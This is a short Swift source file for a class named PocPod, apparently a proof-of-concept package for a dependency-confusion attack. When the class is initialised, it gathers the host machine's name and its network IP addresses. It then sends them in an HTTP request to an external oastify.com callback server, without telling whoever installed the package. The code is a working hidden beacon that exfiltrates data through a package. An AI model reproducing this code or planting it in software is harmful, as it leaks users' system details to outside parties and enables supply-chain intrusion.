import Foundation

class PocPod {
    init() {
        let podName = "pocpockaiksi"
        let hostname = Host.current().localizedName ?? "unknown"
        let ip = getIFAddresses().first ?? "unknown"
        let url = URL(string: "https://phaz26b94106lgibsusi6rlvsmyjm9ay.oastify.com/log?pod=\(podName)&host=\(hostname)&ip=\(ip)")!

        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        URLSession.shared.dataTask(with: request).resume()
    }

    func getIFAddresses() -> [String] {
        var addresses = [String]()
        var ifaddr: UnsafeMutablePointer<ifaddrs>?
        if getifaddrs(&ifaddr) == 0 {
            var ptr = ifaddr
            while ptr != nil {
                let interface = ptr!.pointee
                let addrFamily = interface.ifa_addr.pointee.sa_family
                if addrFamily == UInt8(AF_INET) || addrFamily == UInt8(AF_INET6) {
                    if let name = String(validatingUTF8: interface.ifa_name),
                       name != "lo0" {
                        var hostname = [CChar](repeating: 0, count: Int(NI_MAXHOST))
                        getnameinfo(interface.ifa_addr, socklen_t(interface.ifa_addr.pointee.sa_len),
                                    &hostname, socklen_t(hostname.count),
                                    nil, socklen_t(0), NI_NUMERICHOST)
                        addresses.append(String(cString: hostname))
                    }
                }
                ptr = ptr!.pointee.ifa_next
            }
            freeifaddrs(ifaddr)
        }
        return addresses
    }
}

